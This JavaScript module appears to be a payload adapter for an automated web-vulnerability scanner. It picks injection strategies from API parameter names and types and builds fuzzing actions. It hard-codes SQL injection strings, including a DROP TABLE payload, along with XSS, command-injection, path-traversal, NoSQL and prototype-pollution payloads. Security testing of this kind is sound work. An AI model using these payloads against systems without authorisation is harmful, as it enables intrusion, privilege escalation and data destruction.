/**
 * Security Payload Adapter
 * Adapts payloads based on parameter context, content-type, and type hints
 */

/**
 * Analyze parameter descriptor to determine payload strategy
 * @param {Object} paramDescriptor - Parameter descriptor from importMeta
 * @returns {Object} Payload adaptation hints
 */
function analyzeParamDescriptor(paramDescriptor) {
  if (!paramDescriptor || typeof paramDescriptor !== 'object') {
    return { type: 'unknown', strategy: 'generic' };
  }
  
  const { name, path, location, type, example, default: defaultValue, enum: enumValues } = paramDescriptor;
  const paramName = (name || path || '').toLowerCase();
  
  // Type-based analysis
  const typeHints = {
    'string': { type: 'string', strategy: 'string-injection' },
    'number': { type: 'number', strategy: 'numeric-injection' },
    'integer': { type: 'number', strategy: 'numeric-injection' },
    'boolean': { type: 'boolean', strategy: 'boolean-injection' },
    'object': { type: 'object', strategy: 'object-injection' },
    'array': { type: 'array', strategy: 'array-injection' }
  };
  
  const baseType = typeHints[type?.toLowerCase()] || { type: 'unknown', strategy: 'generic' };
  
  // Name-based specializations
  const namePatterns = {
    id: { type: 'identifier', strategy: 'idor-sqli' },
    user: { type: 'identifier', strategy: 'idor-sqli' },
    email: { type: 'email', strategy: 'email-injection' },
    url: { type: 'url', strategy: 'ssrf-injection' },
    file: { type: 'file', strategy: 'path-traversal' },
    path: { type: 'path', strategy: 'path-traversal' },
    query: { type: 'search', strategy: 'sqli-xss' },
    search: { type: 'search', strategy: 'sqli-xss' },
    filter: { type: 'filter', strategy: 'sqli-nosqli' },
    template: { type: 'template', strategy: 'ssti' },
    redirect: { type: 'redirect', strategy: 'open-redirect' },
    callback: { type: 'url', strategy: 'ssrf-injection' },
    webhook: { type: 'url', strategy: 'ssrf-injection' },
    role: { type: 'privilege', strategy: 'mass-assignment' },
    permission: { type: 'privilege', strategy: 'mass-assignment' },
    admin: { type: 'privilege', strategy: 'mass-assignment' }
  };
  
  for (const [pattern, hint] of Object.entries(namePatterns)) {
    if (paramName.includes(pattern)) {
      return {
        ...baseType,
        ...hint,
        // Keep numeric typing when schema explicitly says number.
        type: baseType.type === 'number' ? 'number' : hint.type,
        paramName: pattern
      };
    }
  }
  
  // Enum-based analysis
  if (Array.isArray(enumValues) && enumValues.length) {
    return {
      ...baseType,
      strategy: 'enum-bypass',
      enumValues: enumValues.slice(0, 10)
    };
  }
  
  // Example-based analysis
  if (example !== undefined && example !== null) {
    const exampleStr = String(example);
    if (/^\d+$/.test(exampleStr)) {
      return { ...baseType, type: 'number', strategy: 'numeric-injection' };
    }
    if (exampleStr.includes('@')) {
      return { ...baseType, type: 'email', strategy: 'email-injection' };
    }
    if (exampleStr.startsWith('http')) {
      return { ...baseType, type: 'url', strategy: 'ssrf-injection' };
    }
    if (exampleStr.includes('/') || exampleStr.includes('\\')) {
      return { ...baseType, type: 'path', strategy: 'path-traversal' };
    }
  }
  
  return baseType;
}

/**
 * Adapt payload for numeric parameters
 * @param {string} basePayload - Original payload
 * @param {Object} hints - Adaptation hints
 * @returns {string|string[]} Adapted payload(s)
 */
function adaptForNumericType(basePayload, hints = {}) {
  const numericPayloads = {
    'SQLi': [
      '1 OR 1=1',
      '1 AND 1=2',
      '1 UNION SELECT null--',
      '1; SELECT 1',
      '1 AND SLEEP(5)'
    ],
    'NoSQLi': [
      '1',
      '0',
      '-1',
      '999999'
    ],
    'IDOR': [
      '0',
      '-1',
      '99999',
      '1e0',
      '1.0'
    ]
  };
  
  const vector = hints.vector || 'SQLi';
  return numericPayloads[vector] || basePayload;
}

/**
 * Adapt payload for string parameters
 * @param {string} basePayload - Original payload
 * @param {Object} hints - Adaptation hints
 * @returns {string|string[]} Adapted payload(s)
 */
function adaptForStringType(basePayload, hints = {}) {
  const stringPayloads = {
    'SQLi': [
      "' OR '1'='1",
      "' AND '1'='1",
      "'; DROP TABLE users--",
      "' UNION SELECT null--",
      "' OR 1=1--"
    ],
    'XSS': [
      '<script>alert(1)</script>',
      '"><img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      "'-alert(1)-'"
    ],
    'CommandInjection': [
      'test; id',
      'test && id',
      'test | id',
      '$(id)',
      '`id`'
    ],
    'PathTraversal': [
      '../../../etc/passwd',
      '..%2F..%2F..%2Fetc%2Fpasswd',
      '....//....//etc/passwd'
    ]
  };
  
  const vector = hints.vector || 'SQLi';
  return stringPayloads[vector] || basePayload;
}

/**
 * Adapt payload for object/JSON parameters
 * @param {string} basePayload - Original payload
 * @param {Object} hints - Adaptation hints
 * @returns {string|string[]} Adapted payload(s)
 */
function adaptForObjectType(basePayload, hints = {}) {
  const objectPayloads = {
    'NoSQLi': [
      '{"$gt": ""}',
      '{"$ne": null}',
      '{"$regex": ".*"}',
      '{"$where": "this.role==\"admin\""}'
    ],
    'PrototypePollution': [
      '{"__proto__":{"isAdmin":true}}',
      '{"constructor":{"prototype":{"isAdmin":true}}}',
      '{"__proto__.isAdmin": true}'
    ],
    'MassAssignment': [
      '{"role":"admin"}',
      '{"isAdmin":true}',
      '{"permissions":["read","write","delete"]}'
    ]
  };
  
  const vector = hints.vector || 'NoSQLi';
  return objectPayloads[vector] || basePayload;
}

/**
 * Adapt payload based on content-type
 * @param {string} basePayload - Original payload
 * @param {string} contentType - HTTP content-type
 * @param {string} vector - Vulnerability vector
 * @returns {string} Adapted payload formatted for content-type
 */
function adaptForContentType(basePayload, contentType, vector) {
  if (typeof contentType !== 'string') return basePayload;
  
  const ct = contentType.toLowerCase();
  
  if (ct.includes('application/json')) {
    // Ensure payload is valid JSON
    try {
      JSON.parse(basePayload);
      return basePayload;
    } catch {
      // Wrap in JSON structure
      return JSON.stringify({ input: basePayload });
    }
  }
  
  if (ct.includes('application/xml') || ct.includes('text/xml')) {
    // Convert to XML format
    if (vector === 'XXE') {
      return basePayload;
    }
    return `<![CDATA[${basePayload}]]>`;
  }
  
  if (ct.includes('multipart/form-data')) {
    // Multipart - payload stays the same, location changes
    return basePayload;
  }
  
  if (ct.includes('application/x-www-form-urlencoded')) {
    // URL encode
    return encodeURIComponent(basePayload);
  }
  
  return basePayload;
}

/**
 * Generate context-aware payloads for a vulnerability vector
 * @param {string} vector - Vulnerability vector (SQLi, XSS, etc.)
 * @param {Object} paramDescriptor - Parameter descriptor
 * @param {string} contentType - HTTP content-type
 * @param {string} safetyTier - Safety tier: 'safe', 'controlled-mutation', 'high-risk'
 * @returns {string[]} Array of adapted payloads
 */
function generateContextAwarePayload(vector, paramDescriptor, contentType, safetyTier = 'safe') {
  const hints = analyzeParamDescriptor(paramDescriptor);
  const { type, strategy } = hints;
  
  let basePayloads = [];
  
  // Select base payloads based on type and vector
  if (type === 'number') {
    basePayloads = adaptForNumericType('', { vector });
  } else if (type === 'object') {
    basePayloads = adaptForObjectType('', { vector });
  } else {
    basePayloads = adaptForStringType('', { vector });
  }
  
  // Filter by safety tier
  if (safetyTier === 'safe') {
    basePayloads = basePayloads.slice(0, 3);
  } else if (safetyTier === 'controlled-mutation') {
    basePayloads = basePayloads.slice(0, 5);
  }
  
  // Adapt for content-type
  const adaptedPayloads = basePayloads.map(payload => 
    adaptForContentType(payload, contentType, vector)
  );
  
  return adaptedPayloads;
}

/**
 * Resolve optimal injection location based on parameter context
 * @param {Object} paramDescriptor - Parameter descriptor
 * @param {string} vector - Vulnerability vector
 * @returns {string} Optimal location: 'query', 'body', 'header', 'path'
 */
function resolveInjectionLocation(paramDescriptor, vector) {
  if (!paramDescriptor || typeof paramDescriptor !== 'object') {
    return 'query';
  }
  
  const { location, name, type } = paramDescriptor;
  
  // Respect explicit location if provided
  if (['query', 'body', 'header', 'path'].includes(location)) {
    return location;
  }
  
  // Type-based location hints
  const paramName = (name || '').toLowerCase();
  
  if (type === 'object' || vector === 'NoSQLi' || vector === 'MassAssignment') {
    return 'body';
  }
  
  if (paramName.includes('header') || paramName.includes('token')) {
    return 'header';
  }
  
  if (paramName.includes('id') || paramName.includes('path')) {
    return 'path';
  }
  
  return 'query';
}

/**
 * Build a complete adapted injection action
 * @param {string} vector - Vulnerability vector
 * @param {Object} paramDescriptor - Parameter descriptor
 * @param {string} contentType - HTTP content-type
 * @param {string} safetyTier - Safety tier
 * @returns {Object} Adapted injection action
 */
function buildAdaptedInjectionAction(vector, paramDescriptor, contentType, safetyTier) {
  const hints = analyzeParamDescriptor(paramDescriptor);
  const location = resolveInjectionLocation(paramDescriptor, vector);
  const payloads = generateContextAwarePayload(vector, paramDescriptor, contentType, safetyTier);
  
  const paramName = paramDescriptor?.name || paramDescriptor?.path || 'input';
  
  return {
    type: 'fuzz_list',
    vector,
    target_param: paramName,
    target_location: location,
    payloads,
    success_indicators: {
      status_codes: [200, 400, 500],
      body_contains: [],
      time_delta_ms: 0
    },
    adaptation_hints: hints
  };
}

module.exports = {
  analyzeParamDescriptor,
  adaptForNumericType,
  adaptForStringType,
  adaptForObjectType,
  adaptForContentType,
  generateContextAwarePayload,
  resolveInjectionLocation,
  buildAdaptedInjectionAction
};
